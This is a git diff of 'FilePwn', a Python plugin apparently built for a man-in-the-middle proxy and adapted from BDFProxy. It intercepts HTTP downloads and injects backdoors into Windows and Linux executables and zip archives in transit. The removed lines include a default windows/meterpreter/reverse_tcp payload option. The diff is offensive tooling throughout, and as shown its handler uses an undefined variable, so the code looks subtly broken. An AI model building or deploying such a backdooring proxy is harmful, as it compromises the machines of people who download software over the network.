@@ -1,33 +1,33 @@
 ################################################################################################
 # 99.9999999% of this code is stolen from BDFProxy - https://github.com/secretsquirrel/BDFProxy
 # 
-# This is just a test to see if i can actually implement it correctly!! NOT THE FINAL VERSION!!!!
+# This is just a test to see if i can actually implement it correctly!! STILL WORK IN PROGRESS!!!!
 #################################################################################################
 
 import sys, os
 import pefile
 import zipfile
 import logging
-import json
 import shutil
+import requests
+import random
+import string
 from bdfactory import pebin, elfbin
 from plugins.plugin import Plugin
 from tempfile import mkstemp
 
-
-# for now lets not read from a config file
-#try:
-    #from configobj import ConfigObj
-#except:
-    #sys.exit('[-] configobj not installed!')
+try:
+    from configobj import ConfigObj
+except:
+    sys.exit('[-] configobj not installed!')
 
 class FilePwn(Plugin):
     name = "FilePwn"
     optname = "filepwn"
     implements = ["handleResponse"]
-    has_opts = True
+    has_opts = False
     log_level = logging.DEBUG
-    desc = "Backdoor executables being sent over http using bdfactory (STILL WORK IN PROGRESS!!)"
+    desc = "Backdoor executables being sent over http using bdfactory"
 
     def convert_to_Bool(self, aString):
         if aString.lower() == 'true':
@@ -39,17 +39,27 @@ class FilePwn(Plugin):
 
     def initialize(self,options):
         '''Called if plugin is enabled, passed the options namespace'''
+        self.options = options
 
         self.binaryMimeTypes = ["application/octet-stream", 'application/x-msdownload',
                                 'application/x-msdos-program', 'binary/octet-stream']
         #FOR FUTURE USE
         self.zipMimeTypes = ['application/x-zip-compressed', 'application/zip']
 
-        #USED NOW
-        self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
+        #NOT USED NOW
+        #self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
         
-        self.options = options
-        #userConfig = ConfigObj('bdfproxy.cfg')
+        self.userConfig = ConfigObj('filepwn.cfg')
+        self.FileSizeMax = self.userConfig['targets']['ALL']['FileSizeMax']
+        self.WindowsIntelx86 = self.userConfig['targets']['ALL']['WindowsIntelx86']
+        self.WindowsIntelx64 = self.userConfig['targets']['ALL']['WindowsIntelx64']
+        self.WindowsType = self.userConfig['targets']['ALL']['WindowsType']
+        self.LinuxIntelx86 = self.userConfig['targets']['ALL']['LinuxIntelx86']
+        self.LinuxIntelx64 = self.userConfig['targets']['ALL']['LinuxIntelx64']
+        self.LinuxType = self.userConfig['targets']['ALL']['LinuxType']
+        self.zipblacklist = self.userConfig['ZIP']['blacklist']
+
+        print "[*] %s plugin online" % self.name
 
     def binaryGrinder(self, binaryFile):
         """
@@ -155,7 +165,7 @@ class FilePwn(Plugin):
             logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
             return None
     
-    def zip_files(self, aZipFile):
+    def zipGrinder(self, aZipFile):
         "When called will unpack and edit a Zip File and return a zip file"
 
         print "[*] ZipFile size:", len(aZipFile) / 1024, 'KB'
@@ -200,7 +210,6 @@ class FilePwn(Plugin):
             if os.path.isdir(tmpDir + '/' + info.filename) is True:
                 print info.filename, 'is a directory'
                 continue
-
             #Check against keywords
             keywordCheck = False
 
@@ -264,19 +273,16 @@ class FilePwn(Plugin):
         
         content_header = request.client.headers['Content-Type']
 
-        if content_header in self.binaryMimeTypes:
-            orig_binary = request.content.read()
-            bd_binary = self.binaryGrinder(orig_binary)
-            return {'request':request,'data':bd_binary}
-        
-        elif content_header in self.zipMimeTypes:
-            orig_zipfile = request.content.read()
-            bd_zip = self.zip_files(orig_zipfile) 
+        if content_header in self.zipMimeTypes:
+            print "[+] Detected supported zip file type!"
+            bd_zip = self.zipGrinder(data)
             return {'request':request,'data':bd_zip}
-        
-        else:
-            return
 
-    def add_options(self,options):
-        options.add_argument("--msf-file-payload",type=str,default="windows/meterpreter/reverse_tcp",
-                help="Payload you want to use (default: windows/meterpreter/reverse_tcp)")
+        elif content_header in self.binaryMimeTypes:
+            print "[+] Detected supported binary type!"
+            bd_binary = self.binaryGrinder(data)
+            return {'request':request,'data':bd_binary}
+
+        else:
+            print "[-] File is not of supported Content-Type: %s" % content_header
+            return {'request':request,'data':data}
